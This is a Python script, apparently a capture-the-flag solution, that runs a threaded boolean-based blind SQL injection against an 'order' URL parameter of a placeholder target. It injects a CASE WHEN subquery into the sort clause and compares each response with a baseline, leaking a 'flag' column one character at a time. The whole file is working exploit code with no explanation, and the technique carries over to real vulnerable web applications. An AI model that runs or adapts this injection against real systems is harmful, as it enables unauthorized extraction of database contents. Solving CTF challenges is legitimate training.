import requests 
import string
import concurrent.futures

url = 'http://<target-ip>/?order='
yes = requests.get(url + "title").text

def check(counter, c):
    query = f'(CASE WHEN (SELECT SUBSTRING(flag,1,{counter}) FROM flag)="{flag+c}" THEN title ELSE date END)'
    try:
        r = requests.get(url + query, timeout=10).text  
    except requests.exceptions.RequestException as e: 
        print(f"Request failed: {e}")
        return None

    if r == yes:
        return c
    return None

flag = ""
counter = 1
chars = string.ascii_letters + string.digits + "{}"

while True:
    with concurrent.futures.ThreadPoolExecutor() as executor:
        results = [executor.submit(check, counter, c) for c in chars]

        found = False
        for future in concurrent.futures.as_completed(results):
            result = future.result()
            if result:
                flag += result
                print("[+] Current Flag is", flag)
                counter += 1
                found = True
                break

        if not found:
            print("No more characters found, exiting.")
            break

        if flag[-1] == "}":
            print("[+] Final Flag is", flag)
            break
